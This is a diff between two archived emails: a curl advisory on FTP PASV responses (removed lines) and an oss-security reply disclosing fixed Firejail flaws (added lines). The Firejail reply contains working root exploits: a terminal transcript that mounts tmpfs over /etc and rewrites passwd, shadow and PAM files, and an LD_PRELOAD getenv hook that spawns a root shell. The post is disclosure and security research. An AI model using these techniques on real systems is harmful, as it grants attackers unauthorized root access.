@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["3552" "Wednesday" "9" "December" "2020" "07:53:28" "+0100" "Daniel Stenberg" "daniel@haxx.se" "<alpine.DEB.2.20.2012080923130.16776@tvnag.unkk.fr>" "114" "[oss-security] [SECURITY ADVISORY] curl: trusting FTP PASV responses" nil nil nil "12" "2020120906:53:28" "[oss-security] [SECURITY ADVISORY] curl: trusting FTP PASV responses" (number mark "U       daniel@haxx. Dec  9  114/3552  " thread-indent "\"[oss-security] [SECURITY ADVISORY] curl: trusting FTP PASV responses\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] [SECURITY ADVISORY] curl: trusting FTP PASV responses" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["6173" "Thursday" "5" "January" "2017" "23:37:46" "+0100" "Martin Carpenter" "mcarpenter@free.fr" "<1483655866.8979.68.camel@juliet.mcarpenter.org>" "188" "Re: [oss-security] Re: Firejail local root exploit" "^Cc:" nil nil "1" "2017010522:37:46" "[oss-security] Re: Firejail local root exploit" (number mark "        mcarpenter@f Jan  5  188/6173  " thread-indent "\"Re: [oss-security] Re: Firejail local root exploit\"\n") "<a607fa163dc245808d66c3f1b4af06ba@imshyb02.MITRE.ORG>" ("<a607fa163dc245808d66c3f1b4af06ba@imshyb02.MITRE.ORG>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0000
+X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 3554 invoked by uid 550); 9 Dec 2020 06:53:41 -0000
+Received: (qmail 24268 invoked by uid 550); 5 Jan 2017 23:01:58 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,134 +11,207 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
+Received: (qmail 9779 invoked from network); 5 Jan 2017 22:37:59 -0000
+Message-ID: <1483655866.8979.68.camel@juliet.mcarpenter.org>
+In-Reply-To: <a607fa163dc245808d66c3f1b4af06ba@imshyb02.MITRE.ORG>
+References: <a607fa163dc245808d66c3f1b4af06ba@imshyb02.MITRE.ORG>
+X-Mailer: Evolution 3.10.4-0ubuntu2
+Mime-Version: 1.0
+X-sfr-mailing: LEGIT
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 7bit
+Cc: cve-assign@mitre.org
+Date: Thu, 05 Jan 2017 23:37:46 +0100
+From: Martin Carpenter <mcarpenter@free.fr>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 3523 invoked from network); 9 Dec 2020 06:53:41 -0000
-X-Authentication-Warning: giant.haxx.se: dast owned process doing -bs
-Date: Wed, 9 Dec 2020 07:53:28 +0100 (CET)
-From: Daniel Stenberg <daniel@haxx.se>
-X-X-Sender: dast@giant.haxx.se
-To: curl security announcements -- curl users <curl-users@cool.haxx.se>,
-        curl-announce@cool.haxx.se,
-        libcurl hacking <curl-library@cool.haxx.se>,
-        oss-security@lists.openwall.com
-Message-ID: <alpine.DEB.2.20.2012080923130.16776@tvnag.unkk.fr>
-User-Agent: Alpine 2.20 (DEB 67 2015-01-07)
-X-fromdanielhimself: yes
-MIME-Version: 1.0
-Content-Type: text/plain; format=flowed; charset=US-ASCII
-Subject: [oss-security] [SECURITY ADVISORY] curl: trusting FTP PASV responses
+Subject: Re: [oss-security] Re: Firejail local root exploit
+To: oss-security@lists.openwall.com
 
-trusting FTP PASV responses
-===========================
+Hi,
 
-Project curl Security Advisory, December 9th 2020 -
-[Permalink](https://curl.se/docs/CVE-2020-8284.html)
+On Wed, 2017-01-04 at 12:16 -0500, cve-assign@mitre.org wrote:
+> >  * Firejail has too broad attack surface that allows users
+> >  * to specify a lot of options
 
-VULNERABILITY
--------------
+I agree. I've kicked the tires a couple of times over the last year and
+my feeling is that there remains a lot of low hanging exploitable fruit.
+Although the devs have, with some encouragement, introduced macros to
+permanently drop privs or drop euid 0 where possible there are still
+places where that is not the case.
 
-When curl performs a passive FTP transfer, it first tries the `EPSV` command
-and if that is not supported, it falls back to using `PASV`.  Passive mode is
-what curl uses by default.
+Setuid-root makes me sad, copy_file() worries me still and the ability
+for a non-priv user to run any seccomp filter on anything feels like an
+accident waiting to happen (assuming it cannot already be exploited).
 
-A server response to a `PASV` command includes the (IPv4) address and port
-number for the client to connect back to in order to perform the actual data
-transfer.
 
-This is how the FTP protocol is designed to work.
+A handful of concrete examples that I have reported are below. These are
+fixed but not previously discussed here and do not have CVEs AFAIK
+(perhaps MITRE could do the honors where deemed appropriate?).
 
-A malicious server can use the `PASV` response to trick curl into connecting
-back to a given IP address and port, and this way potentially make curl
-extract information about services that are otherwise private and not
-disclosed, for example doing port scanning and service banner extractions.
 
-If curl operates on a URL provided by a user (which by all means is an unwise
-setup), a user can exploit that and pass in a URL to a malicious FTP server
-instance without needing any server breach to perform the attack.
+1. --tmpfs
 
-We are not aware of any exploit of this flaw.
+Prior to these commits:
 
-INFO
-----
+  commit cea58747d61dc56ff8bb57aa02786cd8cc423bca
+  Author: netblue30 <netblue30@yahoo.com>
+  Date:   Mon Jan 25 15:01:57 2016 -0500
 
-This issue has existed in curl for as long as FTP has been supported, since
-day 1.
+      --tmpfs allowd only as root user
 
-The flaw only exists for IPv4 since `PASV` doesn't work for IPv6 and curl will
-prefer `EPSV`. The passive mode setup for FTP is used for both uploads and
-downloads.
+  commit 678cd1495457318dad39178bb646ba1b96332ddb
+  Author: root <root@debian>
+  Date:   Mon Jan 25 14:58:27 2016 -0500
 
-curl can be built without FTP support and applications can explicitly disable
-FTP for single transfers.
+      --tmpfs allowd only as root user
 
-curl users could already mitigate this flaw with `CURLOPT_FTP_SKIP_PASV_IP`
-and `--ftp-skip-pasv-ip`.
 
-Other FTP clients have in the past also had this flaw and have fixed it at
-different points in time. Firefox fixed it in 2007: CVE-2007-1562.
+any non-privileged user could mount a tmpfs over any location. Eg mount
+over /etc to get root shell:
 
-The Common Vulnerabilities and Exposures (CVE) project has assigned the name
-CVE-2020-8284 to this issue.
+martin@ubuntu14:~$ firejail --noprofile --tmpfs=/etc 
+Parent pid 27720, child pid 27721
+Warning: failed to mount /sys
+Child process initialized
+[I have no name!@ubuntu14 firejail]$ echo
+"root:x:0:0:root:/root:/bin/bash" > /etc/passwd
+[I have no name!@ubuntu14 firejail]$ uid=$(id -u)
+[I have no name!@ubuntu14 firejail]$ echo "martin:x:$uid:
+$uid::/tmp:/bin/bash" >> /etc/passwd
+[I have no name!@ubuntu14 firejail]$ echo "root::::::::" > /etc/shadow
+[I have no name!@ubuntu14 firejail]$ echo "martin::::::::"
+>> /etc/shadow
+[I have no name!@ubuntu14 firejail]$ echo "root:x:0:" > /etc/group
+[I have no name!@ubuntu14 firejail]$ echo "martin:x:$uid:" >> /etc/group
+[I have no name!@ubuntu14 firejail]$ touch /etc/{login.defs,pam.conf}
+[I have no name!@ubuntu14 firejail]$ mkdir /etc/pam.d
+[I have no name!@ubuntu14 firejail]$ echo "account sufficient
+pam_permit.so" > /etc/pam.d/other
+[I have no name!@ubuntu14 firejail]$ echo "auth sufficient
+pam_permit.so" >> /etc/pam.d/other
+[I have no name!@ubuntu14 firejail]$ echo "session sufficient
+pam_permit.so" >> /etc/pam.d/other
+[I have no name!@ubuntu14 firejail]$ su - 
+root@ubuntu14:~# id 
+uid=0(root) gid=0(root) groups=0(root)
 
-CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
 
-Severity: Low
+2. Nuke /etc/resolv.conf
 
-AFFECTED VERSIONS
------------------
+This is silly (but was flagged in the change log as a security issue):
+by chrooting to / a non-privileged user can truncate the
+(real) /etc/resolv.conf to 0 bytes. Fixed at:
 
-- Affected versions: curl 4.0 to and including 7.73.0
-- Not affected versions: curl >= 7.74.0
+  commit 6144229605177764b7f3f3450c1a47f56595dc9e
+  Author: netblue30 <netblue30@yahoo.com>
+  Date:   Thu Oct 27 10:16:07 2016 -0400
 
-Also note that (lib)curl is used by many applications, and not always
-advertised as such.
+      security: overwrite /etc/resolv.conf
 
-THE SOLUTION
-------------
 
-The IP address part of the response is now ignored by default, by making
-`CURLOPT_FTP_SKIP_PASV_IP` default to `1L` instead of previously being `0L`.
+3. Non-sticky /tmp, /var/tmp
 
-This has the minor drawback that a small fraction of use cases might break,
-when a server truly needs the client to connect back to a different IP address
-than what the control connection uses and for those `CURLOPT_FTP_SKIP_PASV_IP`
-can be set to `0L`.
+"Mode 0777 considered harmful". For example (priv esc via system util,
+perhaps using "--caps.keep=setuid" left as exercise for reader):
 
-The same goes for the command line tool, which then might need
-`--no-ftp-skip-pasv-ip` set to prevent curl from ignoring the address in the
-server response.
+martin@ubuntu14:~$ firejail --noprofile 
+Parent pid 11658, child pid 11659
+Warning: failed to mount /sys
+Child process initialized
+[martin@ubuntu14 firejail]$ ls -ld /var/tmp
+drwxrwxrwx. 2 root root 40 Jan 26 23:59 /var/tmp
+[martin@ubuntu14 firejail]$ exit
+martin@ubuntu14:~$ ls -ld /var/tmp 
+drwxrwxrwt. 4 root root 4096 Jan 26 19:23 /var/tmp
+martin@ubuntu14:~$ 
 
-A [fix for CVE-2020-8284](https://github.com/curl/curl/commit/ec9cc725d598ac)
 
-RECOMMENDATIONS
---------------
+/tmp was mounted tmpfs 0777 prior to:
 
-We suggest you take one of the following actions immediately, in order of
-preference:
+  commit aa28ac9e09557b833f194f594e2940919d940d1f
+  Author: netblue30 <netblue30@yahoo.com>
+  Date:   Sun Jan 31 15:15:24 2016 -0500
 
-  A - Upgrade curl to version 7.74.0
+      various fixes
 
-  B - Set `CURLOPT_FTP_SKIP_PASV_IP` to `1L` or use `--ftp-skip-pasv-ip`
+/dev, /dev/shm, /var/tmp, /var/lock were mounted 0777 prior to:
 
-  C - Disable FTP availability for your transfers
+  commit cd0ecfc7a7b30abde20db6dea505cd8c58e7c046
+  Author: netblue30 <netblue30@yahoo.com>
+  Date:   Fri Jan 29 09:20:19 2016 -0500
 
-TIMELINE
---------
+      0.9.38-rc1 testing
 
-This issue was first reported to the curl project on November 21, 2020.
+There are other weak perms fixed around here eg /dev/shm/firejail was
+0777 prior to:
 
-This advisory was posted on December 9th 2020.
+  commit 1cab02f5ae3c90c01fae4d1c16381820b757a3a6
+  Author: netblue30 <netblue30@yahoo.com>
+  Date:   Sun Jan 31 11:37:23 2016 -0500
 
-CREDITS
--------
+      various fixes
 
-This issue was reported by Varnavas Papaioannou. Patched by Daniel Stenberg.
+(I have not looked at these related changes and the exploitability of
+the issues that they hope to remediate).
 
-Thanks a lot!
 
--- 
+4. Environment not cleaned before root exec()
 
-  / daniel.haxx.se
-  | Commercial curl support up to 24x7 is available!
-  | Private help, bug fixes, support, ports, new features
-  | https://www.wolfssl.com/contact/
+The --x11 flag runs an X server as root in some circumstances and the
+--env flag can be used to set arbitrary environment variables. This
+skips runtime linker protections on eg LD_* variables for setuid
+executables. So a non-privileged user could pop a root shell in any
+number of ways, eg hooking calls to getenv(3) in xauth(1):
+
+  #!/bin/sh
+  gcc -xc -o rootshell.so -shared -fPIC - <<EOF
+  #include <stdlib.h>
+  char *getenv(const char *name) { exit(system("/bin/sh")); }
+  EOF
+  exec firejail --x11=xorg --env=LD_PRELOAD=$PWD/rootshell.so
+
+There were a couple of fixes:
+
+  commit 3b81e1f2c331644ced87d26a943b22eed6242b8f
+  Author: netblue30 <netblue30@yahoo.com>
+  Date:   Thu Nov 3 10:53:51 2016 -0400
+
+      security: env variables
+
+  commit 72bc0e145c67da24e555d868086953148c52b5fc
+  Author: netblue30 <netblue30@yahoo.com>
+  Date:   Fri Nov 4 09:12:52 2016 -0400
+
+      execv fixes
+
+(the overly-specific LD_PRELOAD asserts that you see in there is a
+(hopefully redundant!) relic of that conversation).
+
+
+5. Finally, I don't think this was one of mine but I spotted it paging
+through the commit log this evening:
+
+  commit a23ac1bf390fa4c3db4ea31e6ee6100a9c511d59
+  Author: netblue30 <netblue30@yahoo.com>
+  Date:   Tue Jan 26 09:19:19 2016 -0500
+
+      don't allow --chroot as user without seccomp support
+
+Currently a non-privileged user can chroot anywhere but is prevented
+from mischief by seccomp filtering. (Thought this  worries me too,
+perhaps someone else can punt it further?). Prior to commit a23ac above
+however systems without seccomp support were permitted to use the
+--chroot flag but could not offer this seccomp mitigation. I'm guessing
+this leads to a privesc via the "copy binary" function on sudo(1) or
+similar (setuid) into a suitably prepared chroot.
+
+
+
+firejail needs more attention IMHO, I'm sure there are more to shake
+out.
+
+Regards,
+
+Martin.
+
+
